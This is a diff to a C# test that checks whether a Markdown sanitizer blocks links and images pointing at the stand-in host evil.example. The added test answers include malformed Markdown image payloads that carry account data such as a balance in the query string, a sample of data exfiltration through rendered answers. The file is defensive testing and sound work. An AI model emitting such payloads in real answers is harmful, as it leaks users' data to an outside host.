@@ -117,10 +117,15 @@ public static partial class RegisterTests
             "![s][1]\n\n[1]: https://evil.example/p.png?d=E-1001-balance-500",
             "<https://evil.example/?d=E-1001-balance-500>",
             "[portal](https://evil.example/login 'Contoso portal')",
+            "!![a](https://evil.example/1)(//evil.example/p.png?d=E-1001)",
+            "!![a](https://evil.example/1)(evil.example/p.png)",
         ];
         SafeMarkdown safe = new(["contoso.example"]);
+        // Judged on the HTML a renderer makes of the answer: no src or href may name evil.example.
         return Task.FromResult(answers.All(answer =>
-            !(c.On("markdown-allowlist") ? safe.Render(answer) : answer).Contains("https://evil.example", StringComparison.Ordinal)));
+            !Regex.Matches(SafeMarkdown.ToHtml(c.On("markdown-allowlist") ? safe.Render(answer) : answer),
+                    "(?:src|href)=\"([^\"]*)\"")
+                .Any(m => m.Groups[1].Value.Contains("evil.example", StringComparison.Ordinal))));
     }
 
     // R07
